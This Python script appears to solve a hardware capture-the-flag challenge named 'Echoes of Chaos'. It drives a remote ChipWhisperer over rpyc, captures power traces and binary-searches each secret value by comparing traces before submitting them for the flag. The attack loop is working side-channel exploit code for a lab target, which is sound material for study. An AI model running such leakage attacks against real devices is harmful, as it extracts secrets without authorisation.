from pathlib import Path
import sys
import os
import numpy as np
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

plt.rcParams.update({
    "font.size": 14,        # base font size
    "axes.titlesize": 18,   # ax.set_title
    "axes.labelsize": 16,   # ax.set_xlabel / set_ylabel
    "xtick.labelsize": 14,
    "ytick.labelsize": 14,
    "legend.fontsize": 14,
})

# Adding parent directory to the path to access utils
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from utils.remote_cw import remote_cw, RemoteConfig
from utils.helper_cv import setup_cw, cap_pass_trace, plot_traces, PLATFORM, interact, upload_firmware
from rpyc.utils.classic import obtain

cfg = RemoteConfig(
    host="remotechipwhisperer.example", # replace with hostname of the remote pi or its IP address
    user="pi",
    key_filename="/home/lorenzinco/.ssh/id_ecdsa", # replace with your private key path
    port=18812,                  # must match the rpyc_classic on the Pi
    connect_host="127.0.0.1",    # local end (your machine)
    remote_host="127.0.0.1",     # remote rpyc_classic bind address
)

def ensure_figures_dir():
    out = Path("figures")
    out.mkdir(parents=True, exist_ok=True)
    return out

def save_overlay(reference_trace, final_trace, byte_pos, out_dir, crop=None):
    """
    Save a two-panel overlay (reference vs final) and their difference.
    If crop is None, automatically pick a window around the largest absolute difference.
    """
    ref = np.array(reference_trace).squeeze()
    cand = np.array(final_trace).squeeze()
    if ref.ndim != 1 or cand.ndim != 1 or ref.shape != cand.shape:
        # try to flatten / squeeze more
        ref = ref.reshape(-1)
        cand = cand.reshape(-1)
    S = len(ref)
    diff_full = np.abs(cand - ref)

    if crop is None:
        # find the region of highest energy in diff and crop a window around it
        win = min(600, S)  # target window width
        idx = int(np.argmax(np.convolve(diff_full, np.ones(50), mode='same')))  # smoothed peak
        start = max(0, idx - win//2)
        end = min(S, start + win)
    else:
        start, end = crop
        start = max(0, start)
        end = min(S, end)

    x = np.arange(start, end)
    ref_win = ref[start:end]
    cand_win = cand[start:end]
    diff_win = cand_win - ref_win

    fig, (ax1, ax2) = plt.subplots(2, 1, sharex=True, figsize=(10,4),
                                   gridspec_kw={'height_ratios':[3,1]})
    ax1.plot(x, ref_win, linewidth=1, label='reference')
    ax1.plot(x, cand_win, linewidth=1, alpha=0.9, label=f'final guess {byte_pos}')
    ax1.set_ylabel('ADC')
    ax1.legend(loc='upper right')
    ax1.set_title(f'Mean traces — reference vs final guess (position {byte_pos+1})')

    ax2.plot(x, diff_win, linewidth=1)
    ax2.set_ylabel('difference')
    ax2.set_xlabel('sample index')
    ax2.axhline(0, color='k', linewidth=0.5, alpha=0.5)

    plt.tight_layout()
    png_path = out_dir / f"echoes_trace_overlay_pos{byte_pos}.png"
    fig.savefig(png_path, dpi=200)
    plt.close(fig)
    return str(png_path)

def main():
    out_dir = ensure_figures_dir()
    with remote_cw(cfg) as cw:
        # This runs on the REMOTE machine inside the venv!
        scope, target, prog = setup_cw(cw,cw.scope())

        # Setting up the scope for capturing
        scope.adc.samples = 2200
        scope.adc.clk_freq = 7500000.0

        # Setup the target for simpleserial
        upload_firmware(cw, scope, prog, "chaos")

        # Attack loop for Echoes of Chaos
        secret_array = []
        
        for byte_pos in range(14, -1, -1):
            # baseline references
            interact(scope, target, command="x", pass_guess=b'')        
            reference_trace = obtain(cap_pass_trace(scope, target, pass_guess=bytes([2, 0, 0, byte_pos]), command="p", reset=False))
            interact(scope, target, command="x", pass_guess=b'')        
            reference_trace_2 = obtain(cap_pass_trace(scope, target, pass_guess=bytes([2, 1, 0, byte_pos]), command="p", reset=False))
            diff_ref = np.sum(np.abs(reference_trace - reference_trace_2))

            min_i = 2
            max_i = 0xffff
            secret_byte = 2
            while min_i <= max_i:
                i = (min_i + max_i) // 2
                interact(scope, target, command="x", pass_guess=b'')        
                trace = obtain(cap_pass_trace(scope, target, pass_guess=bytes([2, i&0xff, i>>8, byte_pos]), command="p", reset=False))
                diff = np.abs(trace - reference_trace)
                if np.sum(diff) > diff_ref+80:
                    max_i = i-1
                else:
                    min_i = i+1
                    secret_byte = i

            # Capture a final trace for the recovered value and save overlay
            final_guess_bytes = bytes([2, secret_byte & 0xff, (secret_byte >> 8) & 0xff, byte_pos])
            interact(scope, target, command="x", pass_guess=b'')
            final_trace = obtain(cap_pass_trace(scope, target, pass_guess=final_guess_bytes, command="p", reset=False))

            # Save overlay plot (auto-crop)
            try:
                png_path = save_overlay(reference_trace, final_trace, byte_pos, out_dir, crop=None)
                print(f"[+] Saved overlay plot: {png_path}")
            except Exception as e:
                print(f"[!] Failed to save overlay for pos {byte_pos}: {e}")

            print(f"[+] Found value {secret_byte} for position {byte_pos+1}")
            secret_array = secret_array + [secret_byte]
        
        secret_array.sort()
        print("[+] Secret array found: ", secret_array)  
        secret_array_extended = []
        for x in secret_array:
            secret_array_extended.append(x & 0xff)
            secret_array_extended.append((x >> 8) & 0xff)
        flag = interact(scope, target, command="a", pass_guess=bytes(secret_array_extended), bytes_to_read=20)
        print("[+] Flag: ", flag)       

if __name__ == "__main__":
    main()
